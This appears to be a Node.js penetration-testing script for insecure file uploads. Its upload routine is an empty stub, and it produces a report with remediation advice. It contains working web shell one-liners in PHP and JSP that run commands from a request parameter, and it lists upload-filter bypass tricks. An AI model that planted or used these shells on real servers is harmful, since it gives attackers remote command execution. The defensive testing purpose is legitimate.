#!/usr/bin/env node
/**
 * File Upload Vulnerability Tester
 * Tests for insecure file upload vulnerabilities.
 */

const https = require('https');
const http = require('http');
const fs = require('fs');

class FileUploadTester {
    constructor(url) {
        this.url = url;
        this.vulnerable = false;
        this.testFiles = {
            phpShell: { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>' },
            jspShell: { name: 'shell.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
            doubleExt: { name: 'test.php.jpg', content: '<?php phpinfo(); ?>' }
        };
    }

    async testFileUpload(param = 'file') {
        console.log(`[*] Testing file upload on ${this.url}...`);
        
        for (const [type, file] of Object.entries(this.testFiles)) {
            try {
                // In real implementation, would use multipart/form-data
                console.log(`[*] Testing: ${file.name}`);
                // Simplified - would need proper multipart encoding
            } catch (err) {
                console.log(`[-] Error: ${err.message}`);
            }
        }
        
        return false;
    }

    generateReport() {
        let report = `# File Upload Vulnerability Test Report for ${this.url}\n\n`;
        
        report += `## Test Files\n\n`;
        for (const [type, file] of Object.entries(this.testFiles)) {
            report += `- **${type}**: ${file.name}\n`;
        }
        report += `\n`;
        
        report += `## Common File Upload Vulnerabilities\n\n`;
        report += `1. **Unrestricted file types**: Allowing executable files\n`;
        report += `2. **Double extension**: test.php.jpg bypass\n`;
        report += `3. **Null byte injection**: test.php\\x00.jpg\n`;
        report += `4. **MIME type spoofing**: Fake Content-Type headers\n`;
        report += `5. **Path traversal**: ../../../uploads/shell.php\n\n`;
        
        report += `## Recommendations\n\n`;
        report += `1. Whitelist allowed file types\n`;
        report += `2. Validate file content, not just extension\n`;
        report += `3. Store files outside web root\n`;
        report += `4. Rename uploaded files\n`;
        report += `5. Scan files for malware\n\n`;
        
        return report;
    }
}

async function main() {
    if (process.argv.length < 3) {
        console.log('Usage: node file_upload_tester.js <url>');
        console.log('Example: node file_upload_tester.js http://example.com/upload');
        process.exit(1);
    }
    
    const url = process.argv[2];
    const tester = new FileUploadTester(url);
    await tester.testFileUpload();
    
    const report = tester.generateReport();
    
    const filename = 'file_upload_test_report.md';
    fs.writeFileSync(filename, report, 'utf8');
    
    console.log(`[+] File upload testing complete`);
    console.log(`[+] Report saved to ${filename}`);
    console.log(`[!] WARNING: Only test applications you own or have permission to test!`);
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = FileUploadTester;

